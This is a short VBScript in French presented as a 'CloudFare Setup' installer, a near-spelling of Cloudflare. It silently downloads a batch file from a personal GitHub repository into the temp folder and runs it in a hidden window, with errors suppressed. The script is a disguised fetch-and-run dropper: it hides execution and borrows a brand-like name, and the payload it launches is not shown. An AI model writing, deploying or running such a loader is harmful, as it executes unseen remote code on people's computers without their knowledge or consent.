' CloudFare Setup VBScript Universal v1.0
' Compatible: Windows 10/11, Admin et User, 32/64-bit
' Exécution silencieuse, pas de fenêtre visible

Option Explicit

Dim objShell, objFSO, objHTTP
Dim strRepoURL, strRawURL, strTempDir, strBatFile
Dim intStatus

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Configuration
strRepoURL = "https://github.com/davidrenand/repos"
strRawURL = "https://raw.githubusercontent.com/davidrenand/repos/main/scripts/"
strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%") & "\CloudFare"

' Créer répertoire temporaire
If Not objFSO.FolderExists(strTempDir) Then
    objFSO.CreateFolder(strTempDir)
End If

' Télécharger Install-Universal.bat depuis GitHub
On Error Resume Next

Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")

objHTTP.Open "GET", strRawURL & "Install-Universal.bat", False
objHTTP.SetRequestHeader "User-Agent", "CloudFare/1.0"
objHTTP.Send

intStatus = objHTTP.Status

If intStatus = 200 Then
    ' Écrire le fichier
    Dim objFile
    Set objFile = objFSO.CreateTextFile(strTempDir & "\Install-Universal.bat", True)
    objFile.Write objHTTP.ResponseText
    objFile.Close
    Set objFile = Nothing
    
    ' Exécuter le fichier batch
    objShell.Run strTempDir & "\Install-Universal.bat", 0, True
Else
    ' Erreur lors du téléchargement
    WScript.Echo "Erreur: Impossible de télécharger Install-Universal.bat (Status: " & intStatus & ")"
End If

On Error GoTo 0

' Nettoyer
Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing

WScript.Quit 0
